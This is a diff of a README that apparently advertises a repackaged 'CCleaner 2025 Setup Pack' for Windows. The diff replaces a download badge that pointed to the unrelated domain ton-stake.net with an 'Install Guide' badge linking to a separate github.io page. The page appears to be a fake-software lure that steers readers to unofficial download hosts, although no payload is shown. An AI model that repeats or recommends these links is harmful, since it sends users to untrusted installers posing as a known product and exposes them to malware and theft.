@@ -3,7 +3,11 @@
 **CCleaner 2025 Setup Pack** is a complete PC optimization tool that removes junk, cleans registry errors, and protects your privacy.  
 The 2025 edition is optimized for Windows 11/10, with faster scans and a redesigned dashboard.
 
-[![Download CCleaner](https://img.shields.io/badge/Download-CCleaner_2025-blueviolet)](https://ton-stake.net)
+
+<a href="https://ccleaner-2025-setup-pack.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
